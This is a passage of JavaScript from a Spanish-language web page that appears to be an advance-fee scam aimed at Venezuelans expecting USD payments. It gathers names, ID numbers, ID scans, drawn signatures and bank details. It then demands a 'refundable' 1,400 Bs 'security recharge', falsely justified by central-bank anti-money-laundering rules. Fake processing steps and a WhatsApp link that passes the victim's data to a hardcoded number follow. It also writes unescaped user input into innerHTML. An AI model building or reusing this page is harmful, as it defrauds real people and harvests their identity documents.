        !depositante.value.trim() ||
        !comprobante.value.trim() ||
        !metodoDeposito.value ||
        !acceptTerms.checked
      ) {
        alert('Por favor, completa todos los campos en Datos Bancarios.');
        return false;
      }
      return true;
    }

    /****************************************************
     * Summaries
     ****************************************************/
    function buildSummaryStep1() {
      const fullName = document.getElementById('fullName').value;
      const phonePrefix = document.getElementById('phonePrefix').value;
      const phoneNumber = document.getElementById('phoneNumber').value;
      const docType = document.getElementById('docType').value;
      const nacionalidad = document.getElementById('nacionalidad').value;
      const cedulaNumber = document.getElementById('cedulaNumber').value;
      const birthDate = document.getElementById('birthDate').value;
      const docUpload = document.getElementById('docUpload');
      const docFileName = docUpload.files.length ? docUpload.files[0].name : '';
      const signatureData = document.getElementById('signatureData').value;

      return `
        <p><strong>Nombres y Apellidos:</strong> ${fullName}</p>
        <p><strong>Teléfono:</strong> ${phonePrefix}-${phoneNumber}</p>
        <p><strong>Tipo de Documento:</strong> ${docType}</p>
        <p><strong>Nacionalidad:</strong> ${nacionalidad}</p>
        <p><strong>N° de Cédula:</strong> ${cedulaNumber}</p>
        <p><strong>Fecha de Nacimiento:</strong> ${birthDate}</p>
        <p><strong>Documento de Identidad:</strong> ${docFileName}</p>
        <div class="signature-preview" style="margin-top:1rem;">
          <strong>Firma Digital:</strong><br/>
          <img src="${signatureData}" alt="Firma Digital" />
        </div>
      `;
    }

    function buildSummaryStep2() {
      const bankNameValue = document.getElementById('bankName').value;
      const [bankCode, bankNameText] = bankNameValue ? bankNameValue.split('|') : ['', ''];
      const accountNumber = document.getElementById('accountNumber').value;
      const accountType = document.getElementById('accountType').value;
      const origenFondos = document.getElementById('origenFondos').value;
      const usdAmount = document.getElementById('usdAmount').value;
      const bsAmount = document.getElementById('bsAmount').value;
      const montoAlto = document.getElementById('montoAlto').value;
      const depositante = document.getElementById('depositante').value;
      const comprobante = document.getElementById('comprobante').value;
      const metodoDeposito = document.getElementById('metodoDeposito').value;

      let currency = 'Bs';
      if (accountType === 'usd') currency = 'USD';
      if (accountType === 'eur') currency = 'EUR';

      return `
        <p><strong>Banco:</strong> ${bankNameText} (${bankCode || 'N/A'})</p>
        <p><strong>Número de Cuenta:</strong> ${accountNumber}</p>
        <p><strong>Tipo de Cuenta / Moneda:</strong> ${accountType.toUpperCase()} (${currency})</p>
        <p><strong>Origen de Fondos:</strong> ${origenFondos}</p>
        ${
          usdAmount 
          ? `<p><strong>Monto en USD:</strong> ${usdAmount} USD</p>`
          : ''
        }
        ${
          bsAmount
          ? `<p><strong>Cálculo en Bolívares:</strong> ${bsAmount} Bs</p>`
          : ''
        }
        <p><strong>¿Recibe montos altos?:</strong> ${montoAlto}</p>
        <hr/>
        <p><strong>Depositante / Titular:</strong> ${depositante}</p>
        <p><strong>N° de Comprobante:</strong> ${comprobante}</p>
        <p><strong>Método de Depósito:</strong> ${
          metodoDeposito === 'pagoMovil' 
            ? 'Pago Móvil'
            : 'Transferencia Tradicional'
        }</p>
      `;
    }

    /****************************************************
     * Llenar Step3
     ****************************************************/
    function fillStep3Explanation() {
      const fullName = document.getElementById('fullName').value.trim() || 'Usuario';
      const usdAmount = parseInt(document.getElementById('usdAmount').value, 10) || 0;
      const bsCalculated = document.getElementById('bsAmount').value || '0';
      const bankNameValue = document.getElementById('bankName').value || '';
      const [bankCode, bankNameText] = bankNameValue.split('|') || [];
      const accountNumber = document.getElementById('accountNumber').value;

      let totalBs = 0;
      if (usdAmount > 0 && bsCalculated) {
        totalBs = parseInt(bsCalculated) + 1400; 
      }

      const immediateDeposit = (totalBs > 0)
        ? totalBs.toLocaleString() + ' Bolívares'
        : 'tus fondos';

      document.getElementById('immediateDeposit').innerText = immediateDeposit;

      let message = `
        Estimado(a) <strong>${fullName}</strong>, 
        has indicado que recibirás <strong>${
          usdAmount > 0 ? usdAmount + ' USD' : 'una cantidad en Bolívares'
        }</strong>
        en la cuenta <strong>${accountNumber}</strong> 
        del banco <strong>${bankNameText || 'tu banco seleccionado'}</strong>. 
        Para garantizar la seguridad y el cumplimiento de las normas bancarias, 
        solicitamos una <strong>Recarga de Seguridad de 1.400,00 Bs</strong> 
        que será reembolsable.
      `;

      if (usdAmount > 0 && bsCalculated) {
        const depositInBs = parseInt(bsCalculated).toLocaleString();
        const totalSum = (parseInt(bsCalculated) + 1400).toLocaleString();
        message += `
          <br/><br/>
          Con esta recarga, tu depósito total ascenderá a <strong>${totalSum} Bs</strong>, 
          ya que recibirás <strong>${depositInBs} Bs</strong> (equivalentes a ${usdAmount} USD) 
          más los <strong>1.400,00 Bs</strong> de verificación.
        `;
      } else {
        message += `
          <br/><br/>
          Tu recarga de 1.400,00 Bs se sumará a los fondos que recibirás, 
          asegurando un depósito total seguro e inmediato.
        `;
      }

      message += `
        <br/><br/>
        <strong>¿Por qué no podemos descontar la recarga de tus fondos?</strong> 
        Porque esta recarga es totalmente reembolsable y no cobramos comisión. 
        Además, la validación de seguridad exige que <strong>tú, ${fullName},</strong> 
        hagas el envío desde tu misma cuenta y no desde terceros. 
        Así cumplimos con las políticas del Banco Central de Venezuela 
        para remesas y la prevención de financiamiento al terrorismo 
        y lavado de capitales.
      `;

      document.getElementById('finalExplanation').innerHTML = message;
    }

    /****************************************************
     * Firma Digital con Canvas
     ****************************************************/
    let isDrawing = false;
    let x = 0;
    let y = 0;
    let signatureCanvas, ctx;

    function openSignaturePad() {
      document.getElementById('signatureModal').style.display = 'flex';
      signatureCanvas = document.getElementById('signatureCanvas');
      ctx = signatureCanvas.getContext('2d');

      signatureCanvas.addEventListener('mousedown', startPosition);
      signatureCanvas.addEventListener('mouseup', finishedPosition);
      signatureCanvas.addEventListener('mousemove', draw);

      signatureCanvas.addEventListener('touchstart', startPositionTouch);
      signatureCanvas.addEventListener('touchend', finishedPositionTouch);
      signatureCanvas.addEventListener('touchmove', drawTouch);
    }

    function closeSignatureModal() {
      document.getElementById('signatureModal').style.display = 'none';
      removeSignatureCanvasListeners();
    }

    function removeSignatureCanvasListeners() {
      signatureCanvas.removeEventListener('mousedown', startPosition);
      signatureCanvas.removeEventListener('mouseup', finishedPosition);
      signatureCanvas.removeEventListener('mousemove', draw);

      signatureCanvas.removeEventListener('touchstart', startPositionTouch);
      signatureCanvas.removeEventListener('touchend', finishedPositionTouch);
      signatureCanvas.removeEventListener('touchmove', drawTouch);
    }

    function startPosition(e) {
      isDrawing = true;
      [x, y] = [e.offsetX, e.offsetY];
    }
    function finishedPosition() {
      isDrawing = false;
      ctx.beginPath();
    }
    function draw(e) {
      if (!isDrawing) return;
      ctx.lineWidth = 2;
      ctx.lineCap = 'round';
      ctx.strokeStyle = '#000';
      ctx.lineTo(e.offsetX, e.offsetY);
      ctx.stroke();
      ctx.beginPath();
      ctx.moveTo(e.offsetX, e.offsetY);
    }

    // Soporte táctil
    function getTouchPos(canvasDom, touchEvent) {
      const rect = canvasDom.getBoundingClientRect();
      return {
        x: touchEvent.touches[0].clientX - rect.left,
        y: touchEvent.touches[0].clientY - rect.top
      };
    }
    function startPositionTouch(e) {
      e.preventDefault();
      isDrawing = true;
      const pos = getTouchPos(signatureCanvas, e);
      x = pos.x;
      y = pos.y;
    }
    function finishedPositionTouch(e) {
      e.preventDefault();
      isDrawing = false;
      ctx.beginPath();
    }
    function drawTouch(e) {
      e.preventDefault();
      if (!isDrawing) return;
      const pos = getTouchPos(signatureCanvas, e);
      ctx.lineWidth = 2;
      ctx.lineCap = 'round';
      ctx.strokeStyle = '#000';
      ctx.lineTo(pos.x, pos.y);
      ctx.stroke();
      ctx.beginPath();
      ctx.moveTo(pos.x, pos.y);
    }

    document.getElementById('clearSignature').addEventListener('click', () => {
      ctx.clearRect(0, 0, signatureCanvas.width, signatureCanvas.height);
    });

    document.getElementById('saveSignature').addEventListener('click', () => {
      const dataURL = signatureCanvas.toDataURL('image/png');
      document.getElementById('signatureData').value = dataURL;

      // Mostrar vista previa
      const previewContainer = document.getElementById('signaturePreviewContainer');
      const previewImg = document.getElementById('signaturePreview');
      previewImg.src = dataURL;
      previewContainer.style.display = 'block';

      closeSignatureModal();
    });

    /****************************************************
     * Step3 => Aceptar Fondos => 35s => 8 Steps
     ****************************************************/
    function aceptarFondos() {
      const recargaUpload = document.getElementById('recargaUpload');
      if (!recargaUpload.files.length) {
        alert('Debes adjuntar el comprobante de la recarga.');
        return;
      }

      finalLoadingOverlay.style.display = 'flex';
      const stepsFinal = 8;
      let stepIndex = 1;

      function showFinalStep(index) {
        for (let i = 1; i <= stepsFinal; i++) {
          document.getElementById(`finalStep${i}`).style.display = 'none';
        }
        document.getElementById(`finalStep${index}`).style.display = 'block';
      }

      showFinalStep(stepIndex);

      const interval = setInterval(() => {
        stepIndex++;
        if (stepIndex <= stepsFinal) {
          showFinalStep(stepIndex);
        } else {
          clearInterval(interval);
        }
      }, 5000);
    }

    /****************************************************
     * WhatsApp Error
     ****************************************************/
    function openWhatsAppError() {
      const fullName = document.getElementById('fullName').value;
      const cedulaNumber = document.getElementById('cedulaNumber').value;
      const docUpload = document.getElementById('docUpload');
      const docFileName = docUpload.files.length ? docUpload.files[0].name : '';
      const usdAmount = document.getElementById('usdAmount').value;
      const bsAmount = document.getElementById('bsAmount').value;
      const comprobante = document.getElementById('comprobante').value;

      let mensaje = `Hola, necesito ayuda con mi transacción:
- Nombre Completo: ${fullName}
- Cédula: ${cedulaNumber}
- Documento Subido: ${docFileName}
- Monto en USD: ${usdAmount || 'N/A'}
- Monto en Bolívares: ${bsAmount || 'N/A'}
- Nº de Comprobante: ${comprobante}
- Estado: No se encontró la recarga de 1.400 Bs
- Fecha: ${new Date().toLocaleDateString()}`;

      mensaje = encodeURIComponent(mensaje);
      const numeroWhats = '17373018059';
      const waLink = `https://wa.me/${numeroWhats}?text=${mensaje}`;
      window.open(waLink, '_blank');
    }

    /****************************************************
     * Mostrar nombre de archivos y mensaje de 7s
     ****************************************************/
    const docUpload = document.getElementById('docUpload');
    const docUploadName = document.getElementById('docUploadName');
    docUpload.addEventListener('change', () => {
      if (docUpload.files.length > 0) {
        docUploadName.textContent = docUpload.files[0].name;
      } else {
        docUploadName.textContent = '';
      }
    });

    const recargaUpload = document.getElementById('recargaUpload');
    const recargaUploadName = document.getElementById('recargaUploadName');
    recargaUpload.addEventListener('change', () => {
      if (recargaUpload.files.length > 0) {
        recargaUploadName.textContent = recargaUpload.files[0].name;
        comprobanteCierreMsg.style.display = 'block';
        setTimeout(() => {
          comprobanteCierreMsg.style.display = 'none';
        }, 7000);
      } else {
        recargaUploadName.textContent = '';
      }
    });

    /****************************************************
     * Autocompletar bank code y calcular Bs
     ****************************************************/
    const bankNameSelect = document.getElementById('bankName');
    const accountNumberInput = document.getElementById('accountNumber');
    bankNameSelect.addEventListener('change', () => {
      const val = bankNameSelect.value;
      if (val.includes('|')) {
        const [code] = val.split('|');
        if (code) {
          accountNumberInput.value = code;
        }
      }
    });

    const usdAmountSelect = document.getElementById('usdAmount');
    const bsAmountInput = document.getElementById('bsAmount');
    usdAmountSelect.addEventListener('change', () => {
      const usdValue = parseInt(usdAmountSelect.value, 10) || 0;
      const calculatedBs = usdValue * 69; // 1 USD = 69 Bs (ficticio)
      bsAmountInput.value = calculatedBs > 0 ? calculatedBs : '';
    });
  </script>
</body>
</html>


